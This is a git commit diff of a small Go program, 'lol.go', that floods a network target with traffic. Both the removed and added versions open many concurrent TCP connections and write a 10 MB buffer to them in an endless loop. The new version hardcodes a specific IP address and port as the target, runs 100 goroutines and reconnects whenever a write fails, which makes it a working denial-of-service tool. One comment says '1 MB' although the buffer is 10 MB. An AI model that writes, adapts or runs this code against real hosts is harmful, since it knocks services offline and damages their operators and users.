56fa3914b4615e4e0946b4ddc3d757131853fc73
Biasstudents <139652035+Biasstudents@users.noreply.github.com>
2023-10-19 16:39:45 +0600

    Update lol.go

--- lol.go
+++ lol.go
@@ -1,53 +1,29 @@
 package main
 
 import (
-	"fmt"
 	"net"
 	"sync"
-	"bytes"
-	"os"
-	"strconv"
 )
 
 func main() {
-	var ipPort string
-	var threads int
-	var err error
-
-	if len(os.Args) == 3 {
-		ipPort = os.Args[1]
-		threads, err = strconv.Atoi(os.Args[2])
-		if err != nil {
-			fmt.Println("Error: threads must be an integer")
-			return
-		}
-	} else {
-		fmt.Print("Enter IP:Port ")
-		fmt.Scanf("%s", &ipPort)
-		fmt.Print("Enter Number of Threads: ")
-		fmt.Scanf("%d", &threads)
-	}
-
 	var wg sync.WaitGroup
-	data := make([]byte, 1024*1024*10) // 10 MB of data
+	data := make([]byte, 1024*1024*10) // 1 MB of data
 
-	for i := 0; i < threads; i++ {
+	for i := 0; i < 100; i++ {
 		wg.Add(1)
 		go func() {
 			defer wg.Done()
-			conn, err := net.Dial("tcp", ipPort)
-			if err != nil {
-				fmt.Println("Dial error:", err)
-				return
-			}
-			defer conn.Close()
-
-			buf := bytes.NewBuffer(data)
 			for {
-				_, err := buf.WriteTo(conn) // Use buffer
+				conn, err := net.Dial("tcp", "83.229.67.249:80")
 				if err != nil {
-					fmt.Println("WriteTo error:", err)
-					break
+					continue // if connection fails, retry
+				}
+				for {
+					_, err := conn.Write(data) // Send 1 MB of data
+					if err != nil {
+						conn.Close()
+						break // if write fails, close and open a new connection
+					}
 				}
 			}
 		}()
